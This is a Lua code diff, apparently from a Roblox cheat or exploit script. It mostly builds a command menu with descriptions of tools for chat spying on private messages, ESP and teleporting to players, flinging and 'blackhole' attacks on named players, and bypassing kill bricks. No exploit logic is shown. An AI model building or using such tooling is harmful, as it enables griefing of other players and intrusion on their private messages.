+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks
+G2L["5d"] = Instance.new("TextButton", G2L["11"]);
+G2L["5d"]["TextWrapped"] = true;
+G2L["5d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["5d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["5d"]["TextSize"] = 14;
+G2L["5d"]["TextScaled"] = true;
+G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5d"]["ZIndex"] = 2147483647;
+G2L["5d"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["5d"]["BackgroundTransparency"] = 1;
+G2L["5d"]["Name"] = [[ >togglekillbricks]];
+G2L["5d"]["Text"] = [[ >togglekillbricks]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks.Info
+G2L["5e"] = Instance.new("StringValue", G2L["5d"]);
+G2L["5e"]["Name"] = [[Info]];
+G2L["5e"]["Value"] = [[Command Info: Makes kill bricks not kill you. Press Z to toggle.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui
+G2L["5f"] = Instance.new("TextButton", G2L["11"]);
+G2L["5f"]["TextWrapped"] = true;
+G2L["5f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["5f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["5f"]["TextSize"] = 14;
+G2L["5f"]["TextScaled"] = true;
+G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5f"]["ZIndex"] = 2147483647;
+G2L["5f"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["5f"]["BackgroundTransparency"] = 1;
+G2L["5f"]["Name"] = [[ >doorsgui]];
+G2L["5f"]["Text"] = [[ >doorsgui]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui.Info
+G2L["60"] = Instance.new("StringValue", G2L["5f"]);
+G2L["60"]["Name"] = [[Info]];
+G2L["60"]["Value"] = [[Command Info: new doors gui added so have fun and im pretty sure its keyless too]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy
+G2L["61"] = Instance.new("TextButton", G2L["11"]);
+G2L["61"]["TextWrapped"] = true;
+G2L["61"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["61"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["61"]["TextSize"] = 14;
+G2L["61"]["TextScaled"] = true;
+G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["61"]["ZIndex"] = 2147483647;
+G2L["61"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["61"]["BackgroundTransparency"] = 1;
+G2L["61"]["Name"] = [[ >chatspy]];
+G2L["61"]["Text"] = [[ >chatspy]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy.Info
+G2L["62"] = Instance.new("StringValue", G2L["61"]);
+G2L["62"]["Name"] = [[Info]];
+G2L["62"]["Value"] = [[Command Info: Let's you spy on private messages and stuff and i edited it and i hope it works for new chat now]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator
+G2L["63"] = Instance.new("TextButton", G2L["11"]);
+G2L["63"]["TextWrapped"] = true;
+G2L["63"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["63"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["63"]["TextSize"] = 14;
+G2L["63"]["TextScaled"] = true;
+G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["63"]["ZIndex"] = 2147483647;
+G2L["63"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["63"]["BackgroundTransparency"] = 1;
+G2L["63"]["Name"] = [[ >translator]];
+G2L["63"]["Text"] = [[ >translator]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator.Info
+G2L["64"] = Instance.new("StringValue", G2L["63"]);
+G2L["64"]["Name"] = [[Info]];
+G2L["64"]["Value"] = [[Command Info: Uses the og chat translator that mastermz showcased but i edited it to hopefully make it work for new chat but with the cost of losing the ability of sending messages with that language]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis
+G2L["65"] = Instance.new("TextButton", G2L["11"]);
+G2L["65"]["TextWrapped"] = true;
+G2L["65"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["65"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["65"]["TextSize"] = 14;
+G2L["65"]["TextScaled"] = true;
+G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["65"]["ZIndex"] = 2147483647;
+G2L["65"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["65"]["BackgroundTransparency"] = 1;
+G2L["65"]["Name"] = [[ >invis]];
+G2L["65"]["Text"] = [[ >invis]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis.Info
+G2L["66"] = Instance.new("StringValue", G2L["65"]);
+G2L["66"]["Name"] = [[Info]];
+G2L["66"]["Value"] = [[Command Info: Togglable invisibility. (press G for computer)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
+G2L["67"] = Instance.new("LocalScript", G2L["11"]);
+G2L["67"]["Name"] = [[maininfo]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin
+G2L["68"] = Instance.new("TextButton", G2L["11"]);
+G2L["68"]["TextWrapped"] = true;
+G2L["68"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["68"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["68"]["TextSize"] = 14;
+G2L["68"]["TextScaled"] = true;
+G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["68"]["ZIndex"] = 2147483647;
+G2L["68"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["68"]["BackgroundTransparency"] = 1;
+G2L["68"]["Name"] = [[ >namelessadmin]];
+G2L["68"]["Text"] = [[ >namelessadmin]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin.Info
+G2L["69"] = Instance.new("StringValue", G2L["68"]);
+G2L["69"]["Name"] = [[Info]];
+G2L["69"]["Value"] = [[Command Info: Basically the best fe admin there is to my knowledge at least.]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>quiz
+G2L["6a"] = Instance.new("TextButton", G2L["11"]);
+G2L["6a"]["TextWrapped"] = true;
+G2L["6a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["6a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["6a"]["TextSize"] = 14;
+G2L["6a"]["TextScaled"] = true;
+G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6a"]["ZIndex"] = 2147483647;
+G2L["6a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["6a"]["BackgroundTransparency"] = 1;
+G2L["6a"]["Name"] = [[>quiz]];
+G2L["6a"]["Text"] = [[>quiz]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>quiz.Info
+G2L["6b"] = Instance.new("StringValue", G2L["6a"]);
+G2L["6b"]["Name"] = [[Info]];
+G2L["6b"]["Value"] = [[Command Info: Opens the quiz gui where you can chat some quizes and stuff with random players choosing answers and it has so many types of quizes too]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>chatdraw
+G2L["6c"] = Instance.new("TextButton", G2L["11"]);
+G2L["6c"]["TextWrapped"] = true;
+G2L["6c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["6c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["6c"]["TextSize"] = 14;
+G2L["6c"]["TextScaled"] = true;
+G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6c"]["ZIndex"] = 2147483647;
+G2L["6c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["6c"]["BackgroundTransparency"] = 1;
+G2L["6c"]["Name"] = [[>chatdraw]];
+G2L["6c"]["Text"] = [[>chatdraw]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>chatdraw.Info
+G2L["6d"] = Instance.new("StringValue", G2L["6c"]);
+G2L["6d"]["Name"] = [[Info]];
+G2L["6d"]["Value"] = [[Command Info: Gives a gui where you can draw stuff  and put it into the chat]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>shyguy
+G2L["6e"] = Instance.new("TextButton", G2L["11"]);
+G2L["6e"]["TextWrapped"] = true;
+G2L["6e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["6e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["6e"]["TextSize"] = 14;
+G2L["6e"]["TextScaled"] = true;
+G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6e"]["ZIndex"] = 2147483647;
+G2L["6e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["6e"]["BackgroundTransparency"] = 1;
+G2L["6e"]["Name"] = [[>shyguy]];
+G2L["6e"]["Text"] = [[>shyguy]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>shyguy.Info
+G2L["6f"] = Instance.new("StringValue", G2L["6e"]);
+G2L["6f"]["Name"] = [[Info]];
+G2L["6f"]["Value"] = [[Command Info: Gives a gui that lets you do a few stuff like turning on touch fling and then turning into scp 096/shy guy (may have had updates since but idk)]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>spy
+G2L["70"] = Instance.new("TextButton", G2L["11"]);
+G2L["70"]["TextWrapped"] = true;
+G2L["70"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["70"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["70"]["TextSize"] = 14;
+G2L["70"]["TextScaled"] = true;
+G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["70"]["ZIndex"] = 2147483647;
+G2L["70"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["70"]["BackgroundTransparency"] = 1;
+G2L["70"]["Name"] = [[>spy]];
+G2L["70"]["Text"] = [[>spy]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>spy.Info
+G2L["71"] = Instance.new("StringValue", G2L["70"]);
+G2L["71"]["Name"] = [[Info]];
+G2L["71"]["Value"] = [[Command Info: Gives a gui to spy on players like esp, viewing, and teleporting to the player]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>hug
+G2L["72"] = Instance.new("TextButton", G2L["11"]);
+G2L["72"]["TextWrapped"] = true;
+G2L["72"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["72"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["72"]["TextSize"] = 14;
+G2L["72"]["TextScaled"] = true;
+G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["72"]["ZIndex"] = 2147483647;
+G2L["72"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["72"]["BackgroundTransparency"] = 1;
+G2L["72"]["Name"] = [[>hug]];
+G2L["72"]["Text"] = [[>hug]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>hug.Info
+G2L["73"] = Instance.new("StringValue", G2L["72"]);
+G2L["73"]["Name"] = [[Info]];
+G2L["73"]["Value"] = [[Command Info: idk exactly what it does but what ik is you can hug people by pressing H]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>skibidirizz
+G2L["74"] = Instance.new("TextButton", G2L["11"]);
+G2L["74"]["TextWrapped"] = true;
+G2L["74"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["74"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["74"]["TextSize"] = 14;
+G2L["74"]["TextScaled"] = true;
+G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["74"]["ZIndex"] = 2147483647;
+G2L["74"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["74"]["BackgroundTransparency"] = 1;
+G2L["74"]["Name"] = [[>skibidirizz]];
+G2L["74"]["Text"] = [[>skibidirizz]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>skibidirizz.Info
+G2L["75"] = Instance.new("StringValue", G2L["74"]);
+G2L["75"]["Name"] = [[Info]];
+G2L["75"]["Value"] = [[Command Info: makes you say brainrot rizz if I remember correctly with a click of a button]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rizz
+G2L["76"] = Instance.new("TextButton", G2L["11"]);
+G2L["76"]["TextWrapped"] = true;
+G2L["76"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["76"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["76"]["TextSize"] = 14;
+G2L["76"]["TextScaled"] = true;
+G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["76"]["ZIndex"] = 2147483647;
+G2L["76"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["76"]["BackgroundTransparency"] = 1;
+G2L["76"]["Name"] = [[>rizz]];
+G2L["76"]["Text"] = [[>rizz]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rizz.Info
+G2L["77"] = Instance.new("StringValue", G2L["76"]);
+G2L["77"]["Name"] = [[Info]];
+G2L["77"]["Value"] = [[Command Info: gives you a gui with actual rizz lines and stuff]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>emotes
+G2L["78"] = Instance.new("TextButton", G2L["11"]);
+G2L["78"]["TextWrapped"] = true;
+G2L["78"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["78"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["78"]["TextSize"] = 14;
+G2L["78"]["TextScaled"] = true;
+G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["78"]["ZIndex"] = 2147483647;
+G2L["78"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["78"]["BackgroundTransparency"] = 1;
+G2L["78"]["Name"] = [[>emotes]];
+G2L["78"]["Text"] = [[>emotes]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>emotes.Info
+G2L["79"] = Instance.new("StringValue", G2L["78"]);
+G2L["79"]["Name"] = [[Info]];
+G2L["79"]["Value"] = [[Command Info: Gives you an emote gui which is the one thats used in those tiktok rizz videos idk]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>blackhole
+G2L["7a"] = Instance.new("TextButton", G2L["11"]);
+G2L["7a"]["TextWrapped"] = true;
+G2L["7a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["7a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["7a"]["TextSize"] = 14;
+G2L["7a"]["TextScaled"] = true;
+G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7a"]["ZIndex"] = 2147483647;
+G2L["7a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["7a"]["BackgroundTransparency"] = 1;
+G2L["7a"]["Name"] = [[>blackhole]];
+G2L["7a"]["Text"] = [[>blackhole]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>blackhole.Info
+G2L["7b"] = Instance.new("StringValue", G2L["7a"]);
+G2L["7b"]["Name"] = [[Info]];
+G2L["7b"]["Value"] = [[Command Info: Gives a little gui that you can put a username in and thenj turn someone into a blackhole that uses unanchoredparts around you which you must walk near those parts or on them for them to go to them]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>obbytroll
+G2L["7c"] = Instance.new("TextButton", G2L["11"]);
+G2L["7c"]["TextWrapped"] = true;
+G2L["7c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["7c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["7c"]["TextSize"] = 14;
+G2L["7c"]["TextScaled"] = true;
+G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7c"]["ZIndex"] = 2147483647;
+G2L["7c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["7c"]["BackgroundTransparency"] = 1;
+G2L["7c"]["Name"] = [[>obbytroll]];
+G2L["7c"]["Text"] = [[>obbytroll]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>obbytroll.Info
+G2L["7d"] = Instance.new("StringValue", G2L["7c"]);
+G2L["7d"]["Name"] = [[Info]];
+G2L["7d"]["Value"] = [[Command Info: Lets you activate stages of obbies that use disappearing parts when touched]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rejoin
+G2L["7e"] = Instance.new("TextButton", G2L["11"]);
+G2L["7e"]["TextWrapped"] = true;
+G2L["7e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["7e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["7e"]["TextSize"] = 14;
+G2L["7e"]["TextScaled"] = true;
+G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["7e"]["ZIndex"] = 2147483647;
+G2L["7e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["7e"]["BackgroundTransparency"] = 1;
+G2L["7e"]["Name"] = [[>rejoin]];
+G2L["7e"]["Text"] = [[>rejoin]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rejoin.Info
+G2L["7f"] = Instance.new("StringValue", G2L["7e"]);
+G2L["7f"]["Name"] = [[Info]];
+G2L["7f"]["Value"] = [[Command Info: Yes I finally added a rejoin command]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>serverhop
+G2L["80"] = Instance.new("TextButton", G2L["11"]);
+G2L["80"]["TextWrapped"] = true;
+G2L["80"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["80"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["80"]["TextSize"] = 14;
+G2L["80"]["TextScaled"] = true;
+G2L["80"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["80"]["ZIndex"] = 2147483647;
+G2L["80"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["80"]["BackgroundTransparency"] = 1;
+G2L["80"]["Name"] = [[>serverhop]];
+G2L["80"]["Text"] = [[>serverhop]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>serverhop.Info
+G2L["81"] = Instance.new("StringValue", G2L["80"]);
+G2L["81"]["Name"] = [[Info]];
+G2L["81"]["Value"] = [[Command Info: I added a server hop command as well too]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>graphics
+G2L["82"] = Instance.new("TextButton", G2L["11"]);
+G2L["82"]["TextWrapped"] = true;
+G2L["82"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["82"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["82"]["TextSize"] = 14;
+G2L["82"]["TextScaled"] = true;
+G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["82"]["ZIndex"] = 2147483647;
+G2L["82"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
+G2L["82"]["BackgroundTransparency"] = 1;
+G2L["82"]["Name"] = [[>graphics]];
+G2L["82"]["Text"] = [[>graphics]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>graphics.Info
+G2L["83"] = Instance.new("StringValue", G2L["82"]);
+G2L["83"]["Name"] = [[Info]];
+G2L["83"]["Value"] = [[Command Info: Graphics gui that sets your graphics like rtx or any others and has presets aswell which makes it pretty cool and has good lighting]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UICorner
+G2L["84"] = Instance.new("UICorner", G2L["10"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.UIStroke
+G2L["85"] = Instance.new("UIStroke", G2L["10"]);
+G2L["85"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["85"]["Color"] = Color3.fromRGB(0, 171, 255);
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.UIDragDetector
+G2L["86"] = Instance.new("UIDragDetector", G2L["d"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
+local function C_c()
+local script = G2L["c"];
+	-- not a complete rewrite but the commands system was rewritten
+	--[[
+	CREDITS THAT WERENT ORIGINALLY IN THE OG VERSION:
+	Nameless Admin,
+	Infinite Yield,
+	some dude named X,
+	E God,
+	More idk I forgot
+	]]
+	
 	local cmdlist = script.Parent.Parent.CmdFrame
 	local cmdbar = script.Parent
 	local input = cmdbar.Input
@@ -1081,7 +1448,7 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
 	local Clip = true
 	local floatName = "dfkjygsahfyvfnw7f8n538dnd4tgregw6er78red48hx35t6rgn8eewi"
 	local TPWalk = false
-	local Mouse = game.Players.LocalPlayer:GetMouse()
+	local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
 	local Direction = Vector3.new(0,0,0)
 	local InterpolatedDir = Direction
 	local Tilt = 0
@@ -1089,8 +1456,9 @@ local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjh
